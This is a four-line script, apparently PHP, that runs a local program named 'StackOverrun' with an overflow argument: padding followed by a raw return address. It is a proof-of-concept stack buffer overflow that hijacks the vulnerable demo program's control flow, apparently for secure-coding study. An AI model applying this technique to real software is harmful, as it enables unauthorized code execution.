$arg = "AAAAAAAAAAAAAA"."\xb0\x05\x40";
$cmd = "./StackOverrun ".$arg;

system($cmd);

